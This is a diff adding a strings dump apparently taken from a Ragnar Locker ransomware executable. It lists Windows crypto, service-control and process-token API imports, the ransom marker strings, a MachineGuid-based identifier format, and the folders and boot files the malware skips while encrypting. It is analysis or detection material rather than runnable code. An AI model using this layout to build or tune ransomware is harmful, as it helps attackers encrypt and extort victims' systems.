@@ -1,0 +1,208 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+@.reloc
+NAR_RPW
+K<^_[]
+PPPPPh
+W?_^[]
+@(l>+
+SD;SDw
+Wow64EnableWow64FsRedirection
+***********************************************************************************
+---RAGNAR SECRET---
+D7q/;M
+.text$mn
+.idata$5
+.rdata
+.rdata$zzzdbg
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.rsrc$01
+.rsrc$02
+GetProcAddress
+LocalAlloc
+LocalFree
+VirtualAlloc
+VirtualFree
+HeapAlloc
+HeapFree
+GetProcessHeap
+OpenProcess
+GetCurrentProcess
+ExitProcess
+TerminateProcess
+CreateThread
+GetLastError
+WaitForSingleObject
+WaitForMultipleObjects
+GetLogicalDrives
+LockFile
+UnlockFile
+GetFileSize
+GetFileSizeEx
+WriteFile
+ReadFile
+DeviceIoControl
+SetFilePointerEx
+FindClose
+CloseHandle
+GetNativeSystemInfo
+GetTickCount
+MapViewOfFile
+UnmapViewOfFile
+lstrcmpiW
+lstrcpyA
+lstrcpyW
+lstrcatW
+lstrlenA
+lstrlenW
+CreateEventW
+CreateFileMappingW
+LoadLibraryW
+CreateProcessW
+GetStartupInfoW
+GetCommandLineW
+GetDriveTypeW
+GetSystemDirectoryW
+GetWindowsDirectoryW
+GetFullPathNameW
+CreateFileW
+SetFileAttributesW
+GetFileAttributesW
+FindFirstFileW
+FindNextFileW
+CopyFileW
+MoveFileExW
+GetVolumeInformationA
+GetVolumeInformationW
+GetComputerNameW
+FindFirstVolumeA
+FindNextVolumeA
+FindVolumeClose
+SetVolumeMountPointA
+GetVolumePathNamesForVolumeNameA
+WTSGetActiveConsoleSessionId
+MultiByteToWideChar
+WideCharToMultiByte
+GetLocaleInfoW
+CreateToolhelp32Snapshot
+Process32FirstW
+Process32NextW
+KERNEL32.dll
+wsprintfA
+wsprintfW
+USER32.dll
+OpenProcessToken
+SetTokenInformation
+GetUserNameW
+CreateProcessAsUserW
+DuplicateTokenEx
+RegCloseKey
+RegOpenKeyExW
+RegQueryValueExW
+CryptAcquireContextW
+CryptDestroyKey
+CryptEncrypt
+CloseServiceHandle
+ControlService
+EnumDependentServicesA
+EnumServicesStatusA
+OpenSCManagerA
+OpenServiceA
+QueryServiceStatusEx
+CryptReleaseContext
+CryptGenRandom
+ADVAPI32.dll
+CommandLineToArgvW
+SHGetSpecialFolderPathW
+SHELL32.dll
+StrStrIA
+StrToIntA
+PathFindExtensionW
+SHLWAPI.dll
+CryptDecodeObjectEx
+CryptImportPublicKeyInfo
+CryptStringToBinaryW
+CryptBinaryToStringA
+CRYPT32.dll
+{Z["\W!MIZ!NbMu&*1B%PoJgDWkraiq3NC_'YOtG+IiMqsRmni9R2et&z+GFzbt 
+ideBuB
+/>2)QM
+NX dN9
+Ul5E&Hq
+=jLf<t
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+0!0'0,030G0M0k1{1
+2!2/2=2g2
+3>3K3T3
+4!4'464|4
+4)576A6H6_6
+8(8\8m8
+;3;A;H;g;
+<=<L<^<{<
+=<=M=f=
+>!>(>/>6>=>D>K>R>Y>`>
+?2?C?I?P?
+0$0Y0`0g0n0u0|0
+1-1<1K1R1w1
+50575c5t5
+67-7C7U7
+8 8T8[8s8x8
+929?9O9t9
+2\2b2n2
+5,555L5
+6R6Y6c6
+7#737G7Y7`7
+8+828D8M8
+9$9+90979I9Q9]9o9|9
+:+:1:>:R:W:]:b:m:t:
+<M=_=f=~=
+>+>=>l>}>
+SOFTWARE\Microsoft\Cryptography
+MachineGuid
+ProductName
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+%s-%s-%s-%s-%s
+kernel32.dll
+Windows
+Windows.old
+Tor browser
+Internet Explorer
+Google
+Opera Software
+Mozilla
+Mozilla Firefox
+$Recycle.Bin
+ProgramData
+All Users
+autorun.inf
+boot.ini
+bootfont.bin
+bootsect.bak
+bootmgr
+bootmgr.efi
+bootmgfw.efi
+desktop.ini
+iconcache.db
+ntuser.dat
+ntuser.dat.log
+ntuser.ini
+thumbs.db
+\\.\PHYSICALDRIVE%d
+-backup
+.ragnar_
+-force
+WinSta0\Default
+\notepad.exe
